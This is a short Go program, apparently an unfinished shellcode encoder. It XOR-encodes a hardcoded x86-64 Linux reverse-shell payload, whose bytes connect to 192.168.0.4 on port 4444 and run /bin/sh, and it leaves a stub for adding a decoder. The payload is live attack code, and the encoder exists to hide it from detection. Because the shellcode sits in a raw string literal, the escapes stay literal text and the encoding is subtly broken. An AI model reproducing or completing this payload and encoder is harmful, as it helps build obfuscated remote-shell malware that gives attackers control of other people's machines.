package main

import "fmt"

// TODO: Replace this for a file descriptor, read input from a binary file
var HardcodedInput = []byte(`
	\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48
	\x97\x48\xb9\x02\x00\x11\x5c\xc0\xa8\x00\x04\x51\x48
	\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e
	\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58
	\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48
	\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05`)

func main() {
	// TODO: Read file here
	fmt.Printf("Input hex: %v", HardcodedInput)
	encodedOutput, _ := encode(HardcodedInput)
	fmt.Printf("[d]: %v \n", encodedOutput)
}

func encode(input []byte) ([]byte, error) {
	encodingOpcodes := []byte("\x50")
	encodingOpcode := encodingOpcodes[0]

	output := []byte{}
	for i, bytecode := range input {
		fmt.Printf("encoding hex input[%d]: %v \n", i, bytecode)
		// let's just do a XOR encoder first
		encodedBytecode := bytecode ^ encodingOpcode
		fmt.Printf("encoded hex input[%d] to %v \n", i, encodedBytecode)
		output = append(output, encodedBytecode)
	}
	return output, nil
}

func prependDecoderStub() {
	// TODO: encoded shellcode => encoded shellcode + appended decoder stub
}
